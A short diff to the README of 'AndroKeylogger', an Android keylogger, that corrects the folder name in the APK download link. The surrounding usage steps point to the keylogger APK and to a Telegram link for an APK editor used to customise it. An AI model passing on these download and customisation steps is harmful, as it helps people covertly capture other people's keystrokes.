@@ -26,7 +26,7 @@ AndroKeylogger is a powerful Android keylogger application designed to provide a
 
 ## Usage
 
-1. Download AndroKeylogger APK file [AndroKeylogger](https://github.com/EvilXploiter/AndroKeylogger/raw/main/apk/AndroKeylogger.apk).
+1. Download AndroKeylogger APK file [AndroKeylogger](https://github.com/EvilXploiter/AndroKeylogger/raw/main/Apk/AndroKeylogger.apk).
 
 2. Download the APK Editor PRO to customize the AndroKeylogger application [APK Editor Pro](https://t.me/EvilXploiter/3).
 
